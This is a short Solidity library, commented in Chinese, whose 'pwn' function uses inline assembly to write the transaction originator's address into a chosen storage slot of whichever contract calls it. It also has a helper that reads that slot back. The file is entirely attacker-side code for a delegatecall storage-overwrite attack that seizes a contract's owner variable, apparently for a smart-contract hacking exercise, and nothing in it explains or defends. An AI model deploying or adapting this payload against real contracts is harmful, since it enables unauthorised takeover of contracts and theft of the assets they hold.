// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

library Lib {
    // 使用 origin() 获取原始交易发送者
    function pwn(uint256 storageSlot) public {
        assembly {
            // 将原始交易发送者地址（tx.origin）写入调用方合约的指定存储槽
            sstore(storageSlot, origin())
        }
    }

    function getOwner(uint256 storageSlot) public view returns (address) {
        address owner;
        assembly {
            owner := sload(storageSlot)
        }
        return owner;
    }
}